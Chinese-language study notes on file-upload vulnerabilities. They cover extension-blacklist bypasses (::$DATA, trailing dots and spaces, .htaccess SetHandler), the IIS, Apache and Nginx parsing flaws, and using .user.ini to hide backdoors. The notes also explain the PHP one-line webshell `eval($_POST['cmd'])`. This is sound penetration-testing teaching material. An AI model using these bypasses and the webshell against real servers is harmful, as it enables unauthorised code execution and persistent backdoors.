在window的时候如果文件名+"::$DATA“会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名。

例如:"phpinfo.php::$DATA” Windows 会自动去掉末尾的 ::$DATA 变成 “phpinfo.php” 。 【删除文件名末尾的点；转换为小写；收尾去空格；循环过滤（例如可能会过滤一次php字符，那么写成phpphp就可以绕过了）】

在 windows 环境下，xx.jpg[ 空格 ] 或 xx.jpg. 这两类文件都是不允许存在的 , 若这样命名,windows 会默认除去空格或点 , 攻击者可以通过抓包 , 在文件名后加一个空格或者点绕过 黑名单 . 若上传成功 , 空格和点都会被 windows 自动消除 , 这样也可以 getshell。

如果在 Apache 中 .htaccess 可被执行 . 且可被上传 . 那可以尝试在 .htaccess 中写入 :SetHandlerapplication/x-httpd-php然后再上传名称为 shell.jpg 的 webshell, 这样 shell.jpg 就可解析为 php 文件。

各解析漏洞 / 修复

解析漏洞

  • IIS6/7.X     IIS6.0

    • 文件夹：image/xxx.jpg –> image.asp/pp.jpg 同样会被IIS6.0当作ASP文件来解析并执行。首先请求/image.asp/pp.jpg，服务器会从头部查找查找"."号,获得.asp/pp.jpg。然后查找"/",如果有则内存截断，所以image.asp/pp.jpg会当做image.asp进行解析。
    • 文件：image.jpg –> image.asp;.jpg 或 xxx.asp;xxx.jpg 此文件就会被当做asp执行【IIS6.0及以下分号后面的扩展名不会被解析，其他类型的执行文件也是一样的】
    • test.jpg/.php，无论文件是否存在都直接交给 php 处理，而 php 又默认开启"cgi.fig_pathinfo"，在开启时访问 url, 比如 http://www.xxx.com/test.php/x.php； 其中 x.php 是不存在的 文件，所以 php 将会向前递归解析，若test.php存在就当做php程序执行，于是就造成了解析漏洞 . IIS7.0 、 IIS7.5 、 Nginx 等 Web服务器

  • Apache：配置安全(/etc/mime.types)，解析漏洞（低版本，不识别就会向前解析xxx.php.yyy.z）；换行解析

  • Nginx：(/etc/mime.types); 在图片中嵌入 PHP 代码 , 然后通过访问 xxx.jpg%00.php 就可以执行其中的代码

拓展

  • .user.ini实战利用的可能性
    • 服务器脚本语言为PHP
    • 服务器使用CGI／FastCGI模式
    • 上传目录下要有可执行的php文件
  1. .user.ini 要比 .htaccess 的应用范围要广一些，毕竟.htaccess只能用于Apache
  2. 但“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻
  3. 故可能需要结合其他漏洞，比如: 对上传时的路径没有检测../，因此导致文件可被上传至任意目录，就可以利用了
  4. 把.user.ini利用在隐藏后门上是个很好的利用方法，我们在存在php文件的目录下留下.user.ini和我们的图片马，就达到了隐藏后门的目的
  • 一句话木马详解 
    <?php @eval($_POST['cmd']); ?>
    • @ 为了是不报错，即使出错也不会报错
    • php里面几个超全局变量：$_GET、$_POST就是其中之一。$_POST[‘x’]; 的意思就是x这个变量，用post的方法接收
    • post是在消息体存放数据，get是在消息头的url路径里存放数据（如xxx.php?x=2）
    • eval()把字符串作为PHP代码执行
// 超全局变量
$GLOBALS  // 在GLOBALS数组中，键名==变量名(即下标)，例如$x = 75, 那么GLOBALS[X]就等于75。
$_SERVER  // 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。
$_REQUEST  // 用于收集HTML表单提交的数据(例如：用来收集表单中的 input 字段数据)。
$_POST  // 被广泛应用于收集表单数据，在HTML form标签的指定该属性："method="post"。
$_GET  // 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性："method="get"。
$_FILES // 用于获取上传的文件
$_ENV  // 存储了一些系统的环境变量，涉及到实际的操作系统。
$_COOKIE  // 是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用cookie）。    语法：$.cookie(名称, 值, [option])
$_SESSION  // 会话，其本来的含义是指有始有终的一系列动作/消息
